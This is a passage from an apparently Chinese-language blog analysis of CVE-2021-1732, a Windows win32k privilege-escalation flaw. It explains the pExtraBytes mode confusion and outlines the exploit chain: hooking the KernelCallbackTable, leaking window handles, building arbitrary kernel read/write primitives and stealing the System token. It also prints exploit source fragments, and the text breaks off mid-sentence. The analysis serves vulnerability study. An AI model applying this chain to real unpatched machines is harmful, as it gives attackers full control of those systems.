pExtraBytes 为任意值来实现桌面堆越界写的。从上图的 160 行也可以看出，当 <code>ptagWNDk-&gt;dwExtraFlag &amp; 0x800 == 0</code> 时，pExtraBytes 就解释为一个<strong>可写内存的地址</strong>，直接通过 <code>pExtraBytes + nIndex</code> 来寻址。</p><p>故我们发现，tagWNDk 实际上使用<strong>两种模式</strong>来保存<strong>窗口扩展内存的地址</strong>：</p><ul><li>dwExtraFlag &amp; 0x800 == 0：在<strong>用户空间系统堆</strong>中，pExtraBytes 解释为<strong>扩展内存</strong>在<strong>用户空间堆</strong>中的地址指针</li><li>dwExtraFlag &amp; 0x800 != 0：在<strong>内核空间桌面堆</strong>中，pExtraBytes 解释为该<strong>扩展内存起始地址</strong>相对于<strong>内核桌面堆基址</strong>的偏移量</li></ul><p>下一部分就将介绍正常情况下两种模式对应的 pExtraBytes 是如何被赋值的。</p><br><h3 id="两种模式下-pExtraBytes-正常赋值流程"><a href="#两种模式下-pExtraBytes-正常赋值流程" class="headerlink" title="两种模式下 pExtraBytes 正常赋值流程"></a>两种模式下 pExtraBytes 正常赋值流程</h3><blockquote><p>模式 1 - 在用户空间系统堆中（直接寻址模式）</p></blockquote><p>该模式下，tagWNDk.pExtraBytes 在调用 CreateWindowEx 创建窗口的过程中被赋值。前半部分的调用链没有什么信息量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[用户态]</span><br><span class="line">- CreateWindowEx 实际调用 user32!CreateWindowExW</span><br><span class="line">- user32!CreateWindowExW 调用 user32!CreateWindowInternal</span><br><span class="line">- user32!CreateWindowInternal 中调用 user32!VerNtUserCreateWindowEx</span><br><span class="line">- user32!VerNtUserCreateWindowEx 中调用 win32u!NtUserCreateWindowEx</span><br><span class="line">- win32u!NtUserCreateWindowEx 中通过系统调用进入内核态，调用 win32kfull!NtUserCreateWindowEx</span><br><span class="line">[内核态]</span><br><span class="line">- win32kfull!NtUserCreateWindowEx 中调用 win32kfull!xxxCreateWindowEx</span><br></pre></td></tr></table></figure><p>调用栈：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/1.png" alt="1"></p><p>xxxCreateWindowEx 506 行调用 win32kbase!HMAllocObject 创建了一个 tagWND 结构体并返回其指针：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/2.png" alt="2"></p><p>521 行设置 ptagWNDk-&gt;pExtraBytes 初值为 0（*(ptagWND + 0x28) 为 ptagWNDk）：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/3.png" alt="3"></p><p>从 821、822 行可以看出，当 ptagWNDk-&gt;cbWndExtra 不为 0 时，会调用 win32kfull!xxxClientAllocWindowClassExtraBytes 来设置 ptagWNDk-&gt;pExtraBytes：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/4.png" alt="4"></p><p>821 行的不等号重载（0xA1 - 0x79 = 0x28）：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/5.png" alt="5"></p><p>win32kfull!xxxClientAllocWindowClassExtraBytes 实现：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/6.png" alt="6"></p><p>阅读代码后，不难发现：</p><ul><li>22 行：通过 nt!KeUserModeCallback<sup>[11]</sup> 回调记录在 <strong>PEB.KernelCallbackTable 表中第 123 项</strong> 的用户层函数，该项是 <strong>user32!_xxxClientAllocWindowClassExtraBytes</strong> 函数的指针</li><li>26 行：user32!_xxxClientAllocWindowClassExtraBytes <strong>返回信息的长度应该为 0x18 字节</strong></li><li>29 行：存储返回信息的地址需小于 MmUserProbeAddress（0x7fffffff0000）</li><li>31 行：<strong>返回信息的第一个指针类型指向在用户态申请的用户堆空间</strong></li><li>34 行：调用 ProbeForRead 验证申请的用户堆地址 + 长度是否小于 MmUserProbeAddress（0x7fffffff0000）</li><li>32、35 行：xxxClientAllocWindowClassExtraBytes 返回用户堆空间地址</li></ul><p>user32!_xxxClientAllocWindowClassExtraBytes 函数：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/7.png" alt="7"></p><p>该回调函数所做的事情就是调用 ntdll!RtlAllocateHeap 申请 cbWndExtra 大小的用户堆空间，并将申请到的堆地址作为返回信息的第一个 8 字节，<strong>调用 ntdll!NtCallbackReturn 修正堆栈后重新返回内核层执行</strong>。</p><p>win32kfull!xxxClientAllocWindowClassExtraBytes 返回后，ptagWNDk-&gt;pExtraBytes 就会被赋值为申请到的用户空间堆地址：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/4.png" alt="4"></p><p>以上过程用 iamelli0t 博客<sup>[12]</sup>的一张图来总结：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/8.png" alt="8"></p><br><blockquote><p>模式 2 - 在系统空间桌面堆中（offset 间接寻址模式）</p></blockquote><p>在该模式下想要赋值 pExtraBytes，须在用户态调用未公开的 user32!ConsoleControl（或 <strong>win32u!NtUserConsoleControl</strong>），调用栈：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/9.png" alt="9"></p><p>win32kfull!NtUserConsoleControl 函数：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/10.png" alt="10"></p><p>由上图可知，要想调用 xxxConsoleControl，需满足：</p><ul><li>14 行：第一个参数（<strong>功能号</strong>）不大于 6</li><li>16 行：第三个参数（<strong>参数信息的长度</strong>）不大于 0x18</li></ul><p>win32kfull!xxxConsoleControl 根据传入的功能号进行不同的操作，一共有 6 种功能（功能号为 1 - 6），<strong>第 6 个功能才会赋值 pExtraBytes</strong>：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/11.png" alt="11"></p><p>由上图分析可得，功能 6 调用 DesktopAlloc 在内核空间桌面堆中分配窗口扩展内存，计算已分配的扩展内存地址到内核桌面堆基址的偏移量，并将偏移量保存到 tagWNDk.pExtraBytes，最后修改 <code>tagWNDk.dwExtraFlag |= 0x800</code>。</p><br><h3 id="POC-攻击手法及难点解决"><a href="#POC-攻击手法及难点解决" class="headerlink" title="POC 攻击手法及难点解决"></a>POC 攻击手法及难点解决</h3><p>经过上面的分析我们已经知道：</p><ol><li>使用 CreateWindowEx 创建窗口的过程中内核会回调用户层函数 user32!_xxxClientAllocWindowClassExtraBytes，由它代为申请用户空间堆，内核用这个地址赋值 pExtraBytes 后，<strong>并未重新设置 dwExtraFlag</strong>（<code>tagWNDk.dwExtraFlag &amp;= ~0x800</code>）</li><li>使用 user32!ConsoleControl 的第 6 个功能，除了能赋值 pExtraBytes，还能设置 <code>tagWNDk.dwExtraFlag |= 0x800</code></li><li>调用 SetWindowLong 写窗口扩展内存时，如果 <code>dwExtraFlag &amp; 0x800 != 0</code>，则使用 offset 间接寻址方式写桌面堆</li></ol><p>在 POC 中，攻击者对 user32!_xxxClientAllocWindowClassExtraBytes 进行挂钩，<strong>在钩子函数中手动调用 win32u!NtUserConsoleControl</strong>，将 pExtraBytes 的解释方式从模式 1 修改为模式 2，然后调用 ntdll!NtCallbackReturn 向内核返回一个能过读写检查的可控值，用于设置 tagWNDk.pExtraBytes。最后调用 SetWindowLong 写附加空间时，就能实现基于内核空间桌面堆基址的可控偏移量越界写。</p><p>还是借用 iamelli0t<sup>[12]</sup> 的图来直观感受：</p><p><img src="/img/article/20220104/reason_analysis/poc_attack/1.png" alt="1"></p><p>设想是美好的，实践起来还会遇到细节上的问题 —— 上个部分所提到的 win32kfull!xxxConsoleControl 功能 6 需要传入<strong>窗口句柄</strong>：</p><p><img src="/img/article/20220104/reason_analysis/poc_attack/2.png" alt="2"></p><p>可攻击需要在 CreateWindowEx 过程里调用 user32!ConsoleControl，此时 CreateWindowEx 还没有返回窗口句柄 HWND，这就需要我们来分析 CreateWindowEx 是怎么创建的窗口句柄。其实在 <strong>3.4.1 节</strong> 我提了一下 xxxCreateWindowEx 506 行调用 win32kbase!HMAllocObject 创建了一个 tagWND 结构体并返回其指针：</p><p><img src="/img/article/20220104/reason_analysis/two_modes/2.png" alt="2.1"></p><p>窗口句柄就是在这个函数中创建并赋值到 tagWND 结构体中的，该函数首先通过 DesktopAlloc 从内核桌面堆申请存储 tagWNDk 的空间：</p><p><img src="/img/article/20220104/reason_analysis/poc_attack/3.png" alt="3"></p><p>然后选出一个<strong>窗口句柄</strong><sup>[13]</sup>并<strong>存储到 &amp;tagWNDk + 0</strong>：</p><p><img src="/img/article/20220104/reason_analysis/poc_attack/4.png" alt="4"></p><p>此外，结合上两张图可以发现 <strong>&amp;tagWNDk + 8 保存了 tagWNDk 相对于桌面堆基址的偏移</strong>。</p><p>幸运的是， user32!_xxxClientAllocWindowClassExtraBytes 之前，win32kbase!HMAllocObject 就已经在 win32kfull!xxxCreateWindowEx 中被调用了，我们要是能把创建的窗口句柄泄露出来就可以补全 POC 链了，问题就转化为<strong>如何泄露 tagWNDk 的内容</strong>。</p><p>这就不得不提起 Windows 内核利用领域使用了 10 年的一项技术 —— 通过未公开函数 user32!HMValidateHandle 泄露内核信息<sup>[14]</sup>，只要把窗口句柄传递给这个函数，它就会<strong>返回 tagWNDk 在用户空间的只读映射指针</strong>（HMAllocObject 创建了桌面堆类型句柄后，会把tagWNDk 对象放入到内核模式到用户模式的映射内存中）。此外，HMValidateHandle 函数的地址可以由 user32!IsMenu 的第一个 call 计算<sup>[14]</sup>。</p><p>那么泄露窗口句柄的难点就迎刃而解了，直接来看完整的 POC 思路：</p><ol><li>将 PEB.KernelCallbackTable 的第 123 项替换成自定义挂钩函数的指针</li><li>创建一些窗口（都属于窗口类 1），并通过 user32!HMValidateHandle 泄露这些窗口对应 tagWNDk 在用户空间的地址</li><li>销毁在步骤 2 中创建的部分窗口，使得桌面堆能回收这些窗口对象所占用的空间。再使用与窗口类 1 cbWndExtra 不同的窗口类 2 创建一个新窗口，这个新窗口的 tagWNDk 对象可能会<strong>使用之前释放掉的空间</strong>。因此，通过在自定义挂钩函数中使用窗口类 2 的 cbWndExtra 搜索先前泄露的 tagWNDk 对象用户空间地址，便可以找到新窗口的 tagWNDk 在用户空间的地址，读取第一个 8 字节即可泄露窗口句柄。</li><li>在自定义挂钩函数中调用 user32!ConsoleControl 来修改新窗口 <code>tagWNDk.dwExtraFlag |= 0x800</code></li><li>在自定义挂钩函数中调用 ntdll!NtCallbackReturn 将可控的虚假偏移量分配给新窗口的 tagWNDk.pExtraBytes</li><li>调用 SetWindowLong 将数据写入内核空间桌面堆基址 + 可控偏移量的地址，这可能会导致超出堆范围的内存访问冲突</li></ol><p>这些步骤都会在 <strong>04 部分</strong> 体现。</p><br><h3 id="EXP-利用手法及难点解决"><a href="#EXP-利用手法及难点解决" class="headerlink" title="EXP 利用手法及难点解决"></a>EXP 利用手法及难点解决</h3><p>对于内核漏洞利用，攻击目标通常是获得 System 令牌，常见的方法如下：</p><ol><li>利用漏洞在内核空间中获得任意地址读写的原语</li><li>泄露一些内核对象的地址，通过 EPROCESS 链找到 System 进程</li><li>将 System 进程的令牌复制到攻击进程以完成权限提升</li></ol><p>我们所面临的困难主要是步骤 1 —— 如何利用”在内核空间桌面堆基地址 + 可控偏移量计算出的地址中写数据”的机会来获取内核空间任意地址读写的原语。本部分将注重逻辑分析，具体实施细节在 <strong>04 部分</strong> 。</p><blockquote><p>任意地址写</p></blockquote><p>由 <strong>3.3 节</strong> 的分析，调用 SetWindowLong 时，传递的 nIndex 必须小于 tagWNDk.cbWndExtra，若是能把该值改大，就能轻松造成内存访问越界。参考 <strong>3.5 节</strong>，tagWNDk + 8 的地方保存着该 tagWNDk 相对于桌面堆基址的偏移。结合这两点，可以构造如下的内存布局：</p><p><img src="/img/article/20220104/reason_analysis/exp_exploit/1.png" alt="1"></p><p>首先通过漏洞将 tagWNDk2.pExtraBytes 设置为 offset 模式寻址（dwExtraFlag |= 0x800），并将其赋值为 tagWNDk0 相对于桌面堆基址的偏移（*(&amp;tagWNDk0 + 8)），于是窗口 2 的扩展内存变成了 tagWNDk0 所在的空间。对窗口 2 调用 SetWindowLong，nIndex 为 <strong>cbWndExtra 在结构体中的偏移（0xC8）</strong>，就能修改到 tagWNDk0.cbWndExtra 了，我们把它改成 0xFFFFFFFF，cbWndExtra 过小的限制就解除了！为了能通过窗口 0 的扩展内存写到窗口 1 的 tagWNDk，还需要提前使用 win32u!NtUserConsoleControl 来让窗口 0 也进入 offset 寻址模式。</p><p>现在对窗口 0 调用 SetWindowLongPtr，nIndex 为<strong>窗口 0 扩展内存与窗口 1 tagWNDk 的偏移 + pExtraBytes 在结构体中的偏移（0x128）</strong>，修改 tagWNDk1.pExtraBytes 为任意值。又因为 tagWNDk1.pExtraBytes 处于直接寻址模式，再对窗口 1 调用 SetWindowLongPtr 就能实现任意地址写了。</p><br><blockquote><p>任意地址读</p></blockquote><p>EXP 中使用 user32!GetMenuBarInfo<sup>[15]</sup> 函数与伪造的 tagMENU 结构体进行内核读取，一次可以读取16个字节，这种巧妙的手法此前未被公开过。该 API 最终会调用 win32kfull!xxxGetMenuBarInfo，并传入 4 个参数 ptagWND，idObject，idItem，&amp;mbi<sup>[16]</sup>：</p><p><img src="/img/article/20220104/reason_analysis/exp_exploit/2.png" alt="2"></p><p>结合 <strong>3.2 节</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ptagWND(user layer)</span><br><span class="line">0x28 ptagWNDk(kernel layer)</span><br><span class="line">0x18 dwStyle</span><br><span class="line">0x58 Window Rect left</span><br><span class="line">0x5C Window Rect top</span><br><span class="line">0x90 spMenu(tagMENU *)</span><br><span class="line">0x00 hMenu</span><br><span class="line">0x28 unknown1</span><br><span class="line">0x2C cItems(for check)</span><br><span class="line">0x40 unknown2(for check)</span><br><span class="line">0x44 unknown3(for check)</span><br><span class="line">0x58 rgItems</span><br><span class="line">0x00 unknown(for exploit)</span><br><span class="line">0x98 spMenuk</span><br><span class="line">0x00 pSelf</span><br></pre></td></tr></table></figure><p>需要注意，<strong>spMenu-&gt;spMenuk-&gt;pSelf 是一个指向 spMenu 自身的指针</strong>。</p><p>分析 xxxGetMenuBarInfo 关键部分：</p><p><img src="/img/article/20220104/reason_analysis/exp_exploit/4.png" alt="4"></p><p><img src="/img/article/20220104/reason_analysis/exp_exploit/5.png" alt="5"></p><p>95 行的等号重载：</p><p><img src="/img/article/20220104/reason_analysis/exp_exploit/6.png" alt="6"></p><p>可以得出分割线往上检查了：</p><ul><li>对于 GetMenuBarInfo 参数<ul><li>87 行：第二个参数 idObject 应为 -3</li><li>98、99 行：0 &lt;= 第三个参数 idItem &lt;= ptagWND-&gt;spMenu-&gt;unknown1-&gt;cItems</li></ul></li><li>对于 tagWNDk 结构体<ul><li>89 行：dwStyle 不能包含 WS_CHILD 属性</li></ul></li><li>对于 tagMENU 结构体<ul><li>105 行：unknown2 与 unknown3 不能为 0</li></ul></li></ul><p>分割线往下就是利用部分了，由 110 - 112、122 - 130、159 行可知，如果伪造的 tagMENU 结构体中 rgItems-&gt;unknown 为<strong>欲读取的地址 - 0x40</strong>，那么就能从 GetMenuBarInfo 第四个参数 pmbi 获得欲读取地址开始的 16 个字节（当然还需要减去一些已知值）。因此，我们需要伪造的 tagMENU 结构体大概长这样：</p><p><img src="/img/article/20220104/reason_analysis/exp_exploit/7.png" alt="7"></p><p>构造好了怎么修改 ptagWND-&gt;spMenu 呢？Kernel Killer 在他的 EXP 中选择使用 SetWindowLongPtr 自带的功能来修改。其实 SetWindowLong 系列函数除了能写窗口附加空间，<strong>如果参数 nIndex 给的是负数，它们还能用于设置 tagWND 的一些字段</strong>，这些功能都是公开的，可以在微软开发文档<sup>[17]</sup> 查到：</p><p><img src="/img/article/20220104/reason_analysis/exp_exploit/8.png" alt="8"></p><p>当 nIndex 为 GWLP_ID 时，win32kfull!xxxSetWindowLongPtr 还会调用 <strong>win32kfull!xxxSetWindowData</strong>，在其中设置 ptagWND-&gt;spMenu 为用户给定的值，并<strong>返回 spMenu 旧值</strong>（<strong>注意：dwStyle 应带有 WS_CHILD 属性</strong>）：</p><p><img src="/img/article/20220104/reason_analysis/exp_exploit/9.png" alt="9"></p><p>就算不知道 SetWindowLongPtr 有这样的功能，也能改到 ptagWND-&gt;spMenu。同 <strong>3.6.1 节</strong> 的理，对窗口 0 调用 SetWindowLongPtr，通过越界写同样能将窗口 1 的 tagWNDk.spMenu 改为自定义的值，这种情况下，SetWindowLongPtr 依旧会返回修改前的旧值：<br><img src="/img/article/20220104/reason_analysis/exp_exploit/11.png" alt="11"></p><p>无论使用哪种方式，现在我们获得了任意地址读的能力！</p><br><blockquote><p>泄露内核对象地址</p></blockquote><p>泄露地址的工作在上一部分已经完成了一半 —— 泄露出了旧 spMenu 的地址，由 <strong>3.2 节</strong> 又有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ptagWND(user layer)</span><br><span class="line">0x10 unknown</span><br><span class="line">0x00 pTEB</span><br><span class="line">0x220 pEPROCESS(of current process)</span><br><span class="line">0x90 spMenu</span><br><span class="line">0x18 unknown0</span><br><span class="line">0x100 unknown</span><br><span class="line">0x00 pEPROCESS(of current process)</span><br><span class="line">0x50 ptagWND</span><br></pre></td></tr></table></figure><p>那么泄露当前进程 EPROCESS 地址的方式就不止一种了：</p><ul><li>通过三次任意地址读，达到 <code>**(__int64 **)(*(__int64 *)(spMenu + 0x18) + 0x100)</code> 的效果（EXP 使用）</li><li>通过四次任意地址读，达到 <code>*(__int64 *)(**(__int64 **)(*(__int64 *)(spMenu + 0x50) + 0x10) + 0x220)</code> 的效果（攻击样本使用）</li></ul><br><blockquote><p>提升进程权限</p></blockquote><p>知道当前进程的 EPROCESS 地址后，遍历 EPROCESS-&gt;ActiveProcessLinks 链表<sup>[18]</sup>，找到 pid 为 4 的进程（System 进程），将其 Token 复制到当前的攻击进程，即可完成提权。</p><p>下面是将用到的 EPROCESS 字段及其偏移量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pEPROCESS</span><br><span class="line">0x2E0 UniqueProcessId// pid</span><br><span class="line">0x2E8 ActiveProcessLinks.Flink// 该字段指向下一个 EPROCESS 结构体的 ActiveProcessLinks（双向链表）</span><br><span class="line">0x358 Token// 令牌</span><br></pre></td></tr></table></figure><br><h2 id="EXP-阅读"><a href="#EXP-阅读" class="headerlink" title="EXP 阅读"></a>EXP 阅读</h2><p>这个部分我将按照 EXP 的程序执行流，把 <strong>03 部分</strong> 完整地串起来，各个技术点的实施细节将在这里展露无遗。</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>169 - 176 行（WinMain 入口）为本窗口程序创建了一个控制台，并将程序的标准输入、输出重定向到这个控制台，这就是为什么运行 EXP 时会有个命令行界面：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(hPrevInstance);<span class="comment">// 告诉编译器，已经使用了参数，不必警告</span></span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(lpCmdLine);<span class="comment">// 应该是创建项目时的模板代码</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">AllocConsole</span>();<span class="comment">// 创建一个控制台</span></span><br><span class="line">FILE* tempFile = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="built_in">freopen_s</span>(&amp;tempFile, <span class="string">&quot;conin$&quot;</span>, <span class="string">&quot;r+t&quot;</span>, stdin);<span class="comment">// 重定向程序的标准输入到控制台</span></span><br><span class="line"><span class="built_in">freopen_s</span>(&amp;tempFile, <span class="string">&quot;conout$&quot;</span>, <span class="string">&quot;w+t&quot;</span>, stdout);<span class="comment">// 重定向程序的标准输出到控制台</span></span><br></pre></td></tr></table></figure><p>178 - 187 行通过未公开的 ntdll!RtlGetNtVersionNumbers 函数获得 Windows 版本信息（主次版本及 OS 内部版本号），并输出到控制台：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(WINAPI* FRtlGetNtVersionNumbers)</span><span class="params">(DWORD*, DWORD*, DWORD*)</span></span>;</span><br><span class="line">DWORD dwMajorVer, dwMinorVer, dwBuildNumber = <span class="number">0</span>;</span><br><span class="line">FRtlGetNtVersionNumbers fRtlGetNtVersionNumbers = (FRtlGetNtVersionNumbers)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;RtlGetNtVersionNumbers&quot;</span>);</span><br><span class="line"><span class="built_in">fRtlGetNtVersionNumbers</span>(&amp;dwMajorVer, &amp;dwMinorVer, &amp;dwBuildNumber);<span class="comment">// 获得版本信息</span></span><br><span class="line">dwBuildNumber &amp;= <span class="number">0x0ffff</span>;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Example CVE-2021-1732 Exp working in windows 10 1809(17763).\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Current system version:\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  MajorVer:&quot;</span> &lt;&lt; dwMajorVer &lt;&lt; <span class="string">&quot; MinorVer:&quot;</span> &lt;&lt; dwMinorVer &lt;&lt; <span class="string">&quot; BuildNumber:&quot;</span> &lt;&lt; dwBuildNumber &lt;&lt; std::endl;<span class="comment">// 输出版本信息到控制台</span></span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);<span class="comment">// 在这里 pause 方便为后面代码的调试下断点</span></span><br></pre></td></tr></table></figure><p>189 - 198 获取一些未公开函数的地址，以便后面使用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">g_fNtUserConsoleControl = (FNtUserConsoleControl)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;win32u.dll&quot;</span>), <span class="string">&quot;NtUserConsoleControl&quot;</span>);<span class="comment">// win32u!NtUserConsoleControl（其实用 user32!ConsoleControl 效果一样）</span></span><br><span class="line">g_fFNtCallbackReturn = (FNtCallbackReturn)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCallbackReturn&quot;</span>);<span class="comment">// ntdll!NtCallbackReturn</span></span><br><span class="line"><span class="comment">// ntdll!RtlAllocateHeap</span></span><br><span class="line">g_fRtlAllocateHeap = (RtlAllocateHeap)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;RtlAllocateHeap&quot;</span>);</span><br><span class="line"><span class="comment">// gs:[0x60] 指向进程 PEB，PEB 结构体偏移 0x58 为 KernelCallbackTable</span></span><br><span class="line">ULONG_PTR pKernelCallbackTable = (ULONG_PTR) *(ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x58</span>);</span><br><span class="line">g_fxxxClientAllocWindowClassExtraBytes = (FxxxClientAllocWindowClassExtraBytes)*(ULONG_PTR*)((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>);<span class="comment">// KernelCallbackTable 第 123 项为 user32!_xxxClientAllocWindowClassExtraBytes</span></span><br><span class="line">g_fxxxClientFreeWindowClassExtraBytes = (FxxxClientFreeWindowClassExtraBytes) * (ULONG_PTR*)((PBYTE)pKernelCallbackTable + <span class="number">0x3E0</span>);<span class="comment">// 第 124 项为 user32!_xxxClientFreeWindowClassExtraBytes（调试用）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">FindHMValidateHandle</span>(&amp;fHMValidateHandle);<span class="comment">// user32!HMValidateHandle</span></span><br></pre></td></tr></table></figure><p>其中 HMValidateHandle 函数地址通过 user32!IsMenu 的第一个 call 计算<sup>[14]</sup>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">FindHMValidateHandle</span><span class="params">(FHMValidateHandle *pfOutHMValidateHandle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *pfOutHMValidateHandle = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hUser32 = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;user32.dll&quot;</span>);</span><br><span class="line">    PBYTE pMenuFunc = (PBYTE)<span class="built_in">GetProcAddress</span>(hUser32, <span class="string">&quot;IsMenu&quot;</span>);<span class="comment">// user32!IsMenu</span></span><br><span class="line">    <span class="keyword">if</span> (pMenuFunc) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0xe8</span> == *pMenuFunc++) &#123;<span class="comment">// 找到第一个 call 指令(0xE8 是 call 指令的 opcode)</span></span><br><span class="line">                DWORD ulOffset = *(PINT)pMenuFunc;<span class="comment">// call 指令的操作数是一个偏移，计算方法为（目标地址 - call 指令地址 - 5）</span></span><br><span class="line">                *pfOutHMValidateHandle = (FHMValidateHandle)(pMenuFunc + <span class="number">5</span> + (ulOffset &amp; <span class="number">0xffff</span>) - <span class="number">0x10000</span>  - ((ulOffset &gt;&gt; <span class="number">16</span> ^ <span class="number">0xffff</span>) * <span class="number">0x10000</span>) );<span class="comment">// 计算得到 user32!HMValidateHandle 地址</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *pfOutHMValidateHandle != <span class="literal">NULL</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>200 - 204 行将 KernelCallbackTable 的 123、124 项替换成自己的挂钩函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">VirtualProtect</span>((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>, <span class="number">0x400</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<span class="comment">// 给 KernelCallbackTable 所在的内存添加可写权限</span></span><br><span class="line">*(ULONG_PTR*)((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>) = (ULONG_PTR)MyxxxClientAllocWindowClassExtraBytes;<span class="comment">// hook 123 项</span></span><br><span class="line">*(ULONG_PTR*)((PBYTE)pKernelCallbackTable + <span class="number">0x3E0</span>) = (ULONG_PTR)MyxxxClientFreeWindowClassExtraBytes;<span class="comment">// hook 124 项，调试用</span></span><br><span class="line"><span class="built_in">VirtualProtect</span>((PBYTE)pKernelCallbackTable + <span class="number">0x3D8</span>, <span class="number">0x400</span>, dwOldProtect, &amp;dwOldProtect);<span class="comment">// 还原内存权限</span></span><br></pre></td></tr></table></figure><p>第 123 项的 hook 函数等到下面用到时再贴出来。第 124 项的 hook 应该是作者为了调试 EXP 而加的，其 hook 函数原封不动地调用了原函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">MyxxxClientFreeWindowClassExtraBytes</span><span class="params">(PVOID pInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID pAddress = *(PVOID*)((PBYTE)pInfo + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">g_fxxxClientFreeWindowClassExtraBytes</span>(pInfo);<span class="comment">// 调用原函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h3><p>206 - 221 